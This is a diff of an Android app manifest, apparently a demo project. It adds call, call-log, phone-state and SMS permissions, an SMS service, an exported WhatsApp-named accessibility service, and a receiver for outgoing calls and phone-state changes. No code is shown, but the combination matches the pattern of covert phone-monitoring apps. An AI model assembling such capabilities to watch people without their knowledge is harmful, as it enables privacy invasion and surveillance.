@@ -3,6 +3,10 @@
     package="stundet.db.demo">
 
     <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
 
     <application
         android:allowBackup="true"
@@ -12,25 +16,40 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.DemoJNSC"
         android:usesCleartextTraffic="true">
+        <service
+            android:name=".MySMSService"
+            android:exported="false"></service>
+
+        <activity
+            android:name=".RetrofitActivity"
+            android:exported="true"></activity>
+
+        <service
+            android:name=".WhatsAppAccebilityService"
+            android:exported="true"
+            android:label="@string/accessibility_service_label"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+                      <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+        </service>
+
         <activity
             android:name=".ServiceType"
             android:exported="false" />
         <activity
             android:name=".HomeScreen"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity>
+            android:exported="true"></activity>
         <activity
             android:name=".Emp_type"
             android:exported="false" />
         <activity
             android:name=".LoginScreen"
             android:exported="true"
-            android:theme="@style/Theme.DemoJNSCNoTaskbar"></activity>
+            android:theme="@style/Theme.DemoJNSCNoTaskbar" />
 
         <uses-library
             android:name="org.apache.http.legacy"
@@ -38,7 +57,22 @@
 
         <activity
             android:name=".MainActivity"
-            android:exported="true" />
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <receiver
+            android:name=".PhListener"
+            android:exported="true">
+            <intent-filter android:priority="-1">
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+                <action android:name="android.intent.action.PHONE_STATE" />
+            </intent-filter>
+        </receiver>
     </application>
 
 </manifest>
